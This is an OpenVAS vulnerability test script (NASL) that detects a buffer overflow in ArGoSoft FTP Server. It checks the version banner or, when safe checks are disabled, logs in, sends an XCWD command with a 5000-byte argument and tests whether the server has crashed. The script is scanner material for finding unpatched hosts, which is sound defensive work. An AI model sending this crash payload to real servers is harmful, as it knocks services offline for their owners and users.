# OpenVAS Vulnerability Test
# $Id: argosoft_server_xcmd.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: ArGoSoft FTP Server XCWD Overflow
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Network Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host is running the ArGoSoft FTP server.

It was possible to shut down the remote FTP server by issuing
a XCWD command followed by a too long argument.

This problem allows an attacker to prevent the remote site i
from sharing some resources with the rest of the world.";

tag_solution = "Upgrade to 1.4.1.2 or newer";

#  Ref: Moran Zavdi <moran@moozatech.com>

if(description)
{
 script_id(15439);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(8704);
 script_xref(name:"OSVDB", value:2618);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

 name = "ArGoSoft FTP Server XCWD Overflow";

 script_name(name);
 

 
 script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
  
 script_copyright("This script is Copyright (C) 2004 David Maciejak");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service.nasl", "secpod_ftp_anonymous.nasl",
 		    "ftpserver_detect_type_nd_version.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# The script code starts here
#

include("ftp_func.inc");
port = get_kb_item("Services/ftp");
if(!port)port = 21;

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");


if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
    if (safe_checks() || ! login)
    {
    	banner = get_ftp_banner(port: port);
	if ( ! banner ) exit(0);
	#220 ArGoSoft FTP Server for Windows NT/2000/XP, Version 1.4 (1.4.1.1)
	if (egrep(pattern:".*ArGoSoft FTP Server .* Version .* \((0\.|1\.([0-3]\.|4(\.0|\.1\.[01])))\).*", string:banner) ) security_message(port);
	exit(0);
    }
    else
    {
      if(ftp_authenticate(socket:soc, user:login, pass:password))
      {
   	s = string("XCWD ", crap(5000), "\r\n");
   	send(socket:soc, data:s);
   	r = recv_line(socket:soc, length:1024);
   	close(soc);
       
        soc = open_sock_tcp(port);
        if(!soc)
        {
          security_message(port);
     	  exit(0);
        }
      }
      close(soc);
    }
  }
}
